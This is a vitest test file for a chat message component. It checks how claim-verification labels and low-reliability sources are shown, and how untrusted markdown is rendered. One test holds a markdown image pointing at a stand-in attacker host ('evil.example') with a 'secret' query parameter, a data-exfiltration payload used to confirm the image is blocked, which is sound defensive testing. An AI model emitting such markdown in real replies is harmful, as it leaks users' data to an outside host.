import { describe, it, expect } from 'vitest'
import type { AnswerClaim } from '@buildaharness/aielia'
import { answerClaimLabel } from './ChatMessageBubble'

function claim(verification_status: AnswerClaim['verification_status']): AnswerClaim {
  return {
    evidence: [],
    confidence: 0.5,
    freshness: null,
    source_type: 'model_reasoning',
    verification_status,
  }
}

// Golden-output test: pins the exact phrasing difference between "this is true" and "I found X
// but couldn't independently verify it" so a future change can't silently collapse the four
// branches back into one generic phrasing (Phase 6 of the harness/assistant remediation plan).
describe('answerClaimLabel', () => {
  it('renders distinct, non-overlapping phrasing for each verification_status branch', () => {
    expect(answerClaimLabel(claim('verified'))).toBe(
      'Checked against the source material I read — the reply matches it.',
    )
    expect(answerClaimLabel(claim('unverified_attempted'))).toBe(
      "I found evidence for this, but couldn't independently verify it.",
    )
    expect(answerClaimLabel(claim('contradicted'))).toBe(
      'This conflicts with something I already believe — worth double-checking.',
    )
    expect(answerClaimLabel(claim('no_evidence'))).toBe(
      'This is my own reasoning, not backed by anything I looked up.',
    )
  })

  it('surfaces the grounding discrepancy when the reply did not match the tool results', () => {
    expect(answerClaimLabel({ ...claim('unverified_attempted'), grounding_note: 'the stated total 4058 is not the sum of the line items (4508)' })).toBe(
      "I found evidence for this, but the reply doesn't fully match it: the stated total 4058 is not the sum of the line items (4508)",
    )
  })

  it('never lets "verified" and "unverified_attempted" collapse to the same phrasing', () => {
    expect(answerClaimLabel(claim('verified'))).not.toBe(answerClaimLabel(claim('unverified_attempted')))
  })
})

describe('ChatMessageBubble — lower-confidence source line', () => {
  const trace = { layerActivity: [], verificationHealth: { strength: 1, feasibility: 1 } } as never
  const withEvidence = (evidence: AnswerClaim['evidence']): AnswerClaim => ({ ...claim('unverified_attempted'), evidence })

  async function whyText(answerClaim: AnswerClaim): Promise<string> {
    const { render, screen, fireEvent } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    const { container } = render(<ChatMessageBubble role="assistant" content="hi" trace={trace} answerClaim={answerClaim} />)
    fireEvent.click(screen.getByText('Why?'))
    return container.textContent ?? ''
  }

  it('shows a LOW-assessed source in the Why? panel', async () => {
    const text = await whyText(withEvidence([{ id: 'source-reliability:notes/old-wiki.md', obs: 'notes/old-wiki.md — archived forum copy', reliability: 'LOW', source: 'notes/old-wiki.md', evidence_type: 'OBSERVATION', freshness: '2026-09-29T00:00:00.000Z' }]))
    expect(text).toContain('Less reliable source: notes/old-wiki.md — archived forum copy')
  })

  it('stays quiet when no source was judged LOW', async () => {
    const text = await whyText(withEvidence([]))
    expect(text).not.toContain('Less reliable source')
  })
})

describe('ChatMessageBubble — untrusted markdown', () => {
  it('does not render an auto-loading image and opens links without navigating the app window', async () => {
    const { render } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    const { container } = render(
      <ChatMessageBubble role="assistant" content={'![x](https://evil.example/?q=secret) [go](https://example.com)'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('image not loaded')
    const link = container.querySelector('a')
    expect(link?.getAttribute('target')).toBe('_blank')
    expect(link?.getAttribute('rel')).toContain('noopener')
  })
})
